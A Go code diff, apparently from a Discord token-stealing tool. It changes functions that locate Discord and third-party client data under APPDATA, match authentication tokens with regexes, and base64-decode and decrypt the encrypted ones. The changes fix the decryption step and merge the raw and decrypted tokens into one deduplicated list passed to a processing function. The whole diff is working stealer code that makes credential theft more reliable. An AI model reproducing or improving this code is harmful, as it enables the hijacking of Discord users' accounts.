@@ -1,6 +1,7 @@
 package main
 
 import (
+	"encoding/base64"
 	"os"
 	"regexp"
 	"strings"
@@ -10,22 +11,20 @@ import (
 var (
 	AppDataPath      = os.Getenv("APPDATA")
 	LocalAppDataPath = os.Getenv("LOCALAPPDATA")
-)
 
-var (
 	DiscordClientPaths = map[string]string{
-		"Discord":        AppDataPath + `\Discord\Local Storage\leveldb`,
-		"Discord Canary": AppDataPath + `\discordcanary\Local Storage\leveldb`,
-		"Discord PTB":    AppDataPath + `\discordptb\Local Storage\leveldb`,
-		"Lightcord":      AppDataPath + `\Lightcord\Local Storage\leveldb`,
-		"Vesktop":        AppDataPath + `\Vesktop\Local Storage\leveldb`,
-		"Equibop":        AppDataPath + `\Equibop\Local Storage\leveldb`,
+		"Discord":        AppDataPath + `\Discord`,
+		"Discord Canary": AppDataPath + `\discordcanary`,
+		"Discord PTB":    AppDataPath + `\discordptb`,
+		"Lightcord":      AppDataPath + `\Lightcord`,
+		"Vesktop":        AppDataPath + `\Vesktop`,
+		"Equibop":        AppDataPath + `\Equibop`,
 	}
 	WebTokenRegex       = regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{38}`)
 	EncryptedTokenRegex = regexp.MustCompile(`dQw4w9WgXcQ:[^"]*`)
 	// "<token>": "<source browser or client>"
 	encryptedTokensList = map[string]string{}
-	rawTokensList       = map[string]string{}
+	tokensList          = map[string]string{}
 )
 
 type DiscordAccountResult struct {
@@ -89,25 +88,37 @@ func findDiscordTokens(path string, name string) ([]string, error) {
 			// Find encrypted tokens
 			if matches := EncryptedTokenRegex.FindAllString(line, -1); matches != nil {
 				for _, encToken := range matches {
+					if encryptedTokensList[encToken] != "" {
+						continue
+					}
+					// add it to the map to avoid duplicate decryption attempts
+					encryptedTokensList[encToken] = name
+
 					// Decrypt the token
 					parts := strings.SplitN(encToken, ":", 2)
 					if len(parts) != 2 {
 						continue
 					}
-					encValue := parts[1]
-					decValue, err := decryptPassword([]byte(encValue), encryptionKey)
+					encValue, err := base64.StdEncoding.DecodeString(parts[1])
+					if err != nil {
+						continue
+					}
+					decValue, err := decryptPassword(encValue, encryptionKey)
 					if err != nil || len(decValue) == 0 {
 						continue
 					}
 					token := string(decValue)
-					if encryptedTokensList[token] == "" {
-						encryptedTokensList[token] = name
+					if !WebTokenRegex.MatchString(token) {
+						continue
+					}
+					if tokensList[token] == "" {
+						tokensList[token] = name
 					}
 				}
 			} else if matches := WebTokenRegex.FindAllString(line, -1); matches != nil {
 				for _, token := range matches {
-					if rawTokensList[token] == "" {
-						rawTokensList[token] = name
+					if tokensList[token] == "" {
+						tokensList[token] = name
 					}
 				}
 			}
@@ -184,14 +195,7 @@ func GrabDiscordTokens() ([]DiscordAccountResult, error) {
 		findDiscordTokens(path, name)
 	}
 
-	for token, source := range encryptedTokensList {
-		handle, err := processDiscordToken(token, source)
-		if err != nil {
-			continue
-		}
-		discordAccountResults = append(discordAccountResults, *handle)
-	}
-	for token, source := range rawTokensList {
+	for token, source := range tokensList {
 		handle, err := processDiscordToken(token, source)
 		if err != nil {
 			continue
